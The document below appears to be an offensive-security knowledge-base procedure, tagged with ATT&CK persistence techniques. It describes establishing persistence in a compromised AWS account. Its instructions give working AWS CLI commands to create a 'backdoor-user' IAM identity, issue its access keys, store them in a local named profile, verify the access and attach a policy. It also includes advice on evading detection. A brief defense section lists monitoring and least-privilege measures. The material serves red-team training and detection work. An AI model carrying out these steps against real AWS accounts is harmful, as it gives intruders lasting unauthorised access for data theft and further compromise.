---
id: 159e92f8-66a0-494b-b8ab-fa5b65344fa5
name: configure-aws-cli-profile-for-persistence
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:10.654877+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Account-Manipulation|T1098 - Account Manipulation]]'
  - '[[techniques/Create-Account|T1136 - Create Account]]'
sub_techniques: []
tags:
  - '[[tags/Cloud - AWS]]'
  - '[[tags/Persistence & Backdooring]]'
  - aws
  - iam
  - persistence
commands:
  - '[[commands/aws-iam-create-user]]'
  - '[[commands/aws-iam-create-access-key]]'
  - '[[commands/aws-configure-named-profile]]'
platforms:
  - AWS
  - Linux
  - macOS
  - Windows
tools:
  - '[[tools/aws-cli]]'
validated: true
---

# Configure AWS CLI Profile for Persistence

## Summary

This procedure outlines how to create a backdoor IAM user in an AWS environment and configure a local AWS CLI profile with its credentials to establish persistent access. It allows attackers to maintain control even if primary credentials are revoked, enabling ongoing operations like data exfiltration or further privilege escalation.

## Description

In a compromised AWS environment, attackers often seek to establish persistence by creating additional IAM users with minimal permissions initially, then attaching policies for backdoor access. This procedure assumes the attacker has initial access via compromised credentials with IAM create/modify permissions. The process involves using AWS CLI to create a new user, generate access keys, and configure a named profile on the attacker's local machine. This profile stores the credentials securely (though encrypted only by default file permissions) and can be used for future sessions without re-entering keys. The technique evades detection by blending with legitimate admin activities and provides a fallback access path. Target environment is any AWS account with IAM services enabled; success leads to long-term access for malicious activities like resource manipulation or lateral movement.

## Requirements

1. Compromised AWS credentials with permissions to create IAM users and access keys (e.g., AdministratorAccess or custom policy allowing iam:CreateUser, iam:CreateAccessKey).
2. AWS CLI installed on the attacker's local machine.
3. Network access to AWS APIs (no direct VPC restrictions on IAM endpoints).
4. Local file system write access to store AWS config files (~/.aws/ on Linux/macOS, %USERPROFILE%\.aws on Windows).

## Defense

- Enable AWS CloudTrail logging for IAM actions and monitor for anomalous user creations (e.g., via Amazon GuardDuty or custom alerts on iam:CreateUser).
- Implement least privilege: Restrict IAM create permissions to trusted roles and use AWS Organizations for account-level controls.
- Regularly audit and rotate access keys; use temporary credentials via STS where possible.
- Monitor local AWS CLI config files on endpoints for unauthorized profiles using endpoint detection tools.

## Objectives

1. Create a backdoor IAM user to serve as a persistent access point.
2. Generate long-term credentials for the user to enable CLI-based interactions.
3. Configure a named AWS CLI profile for seamless, repeated access without exposing primary credentials.
4. Verify the profile enables successful AWS operations, confirming persistence.

## Instructions

1. Create a new IAM user for backdoor access.
   - **Context**: This step establishes the persistent entity in AWS. Use a nondescript name to avoid detection; the user starts with no permissions but can be escalated later.
   - **Command** ([[commands/aws-iam-create-user]]):
     ```bash
     aws iam create-user --user-name backdoor-user
     ```
   - **Expected Output**: JSON response with User ARN and name, e.g., {"User": {"UserName": "backdoor-user", "UserId": "AIDAXYZ", "Arn": "arn:aws:iam::123456789012:user/backdoor-user", "CreateDate": "2023-10-01T00:00:00Z"}}.
   - If the command fails due to permissions, the output will indicate an AccessDenied error; ensure credentials have iam:CreateUser.

2. Generate access keys for the new IAM user.
   - **Context**: Access keys provide programmatic authentication for the CLI profile. Limit to one key pair initially; attach policies post-creation if needed for immediate use.
   - **Command** ([[commands/aws-iam-create-access-key]]):
     ```bash
     aws iam create-access-key --user-name backdoor-user
     ```
   - **Expected Output**: JSON with AccessKeyId and SecretAccessKey (note: save securely as this is the only time the secret is revealed), e.g., {"AccessKey": {"UserName": "backdoor-user", "AccessKeyId": "AKIAIOSFODNN7EXAMPLE", "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "Status": "Active", "CreateDate": "2023-10-01T00:00:00Z"}}.
   - Success: Keys are active; failure shows AccessDenied if no iam:CreateAccessKey permission.

3. Configure the AWS CLI with a named profile using the new credentials.
   - **Context**: This stores the access keys in a local profile file, enabling persistent, profile-specific commands (e.g., aws s3 ls --profile backdoor-profile). Use a descriptive profile name for easy reference.
   - **Command** ([[commands/aws-configure-named-profile]]):
     ```bash
     aws configure --profile backdoor-profile
     ```
   - **Expected Output**: Interactive prompts for Access Key ID, Secret Access Key, default region (e.g., us-east-1), and output format (e.g., json). No output on completion, but files ~/.aws/credentials and ~/.aws/config are updated.
   - Verify by running a test command: aws sts get-caller-identity --profile backdoor-profile; expect JSON with the backdoor user's ARN.

4. (Optional) Attach a policy to the backdoor user for enhanced access.
   - **Context**: If immediate actions are needed, attach an existing policy (e.g., ReadOnlyAccess) to test/expand capabilities without alerting on high-priv actions.
   - **Command** (using AWS CLI inline, no separate command doc):
     ```bash
     aws iam attach-user-policy --user-name backdoor-user --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess
     ```
   - **Expected Output**: No output on success; error if policy ARN invalid or no iam:AttachUserPolicy permission.
   - This step confirms the backdoor is operational; monitor CloudTrail for detection risks.
